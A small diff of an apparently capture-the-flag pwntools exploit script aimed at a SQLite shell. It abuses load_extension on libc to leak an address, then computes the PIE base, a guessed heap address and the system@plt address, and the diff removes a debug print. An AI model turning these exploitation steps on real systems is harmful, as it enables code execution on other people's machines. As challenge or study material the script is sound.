@@ -111,7 +111,6 @@ sla     = lambda a,b:     p.sendlineafter(a,b)
 sla(b"lite>",b"select Load_extension('/lib/x86_64-linux-gnu/libc.so.6','puts');")
 ru(": \n")
 PIE = u64(p.recvn(6).ljust(8,b'\x00'))
-warning(hex(PIE))
 pie_base = PIE - 0x1589a0
 heap = 0x00005555556b0000-0x0000555555554000+pie_base # 1/0x2000
 system_plt = pie_base + 0x10910
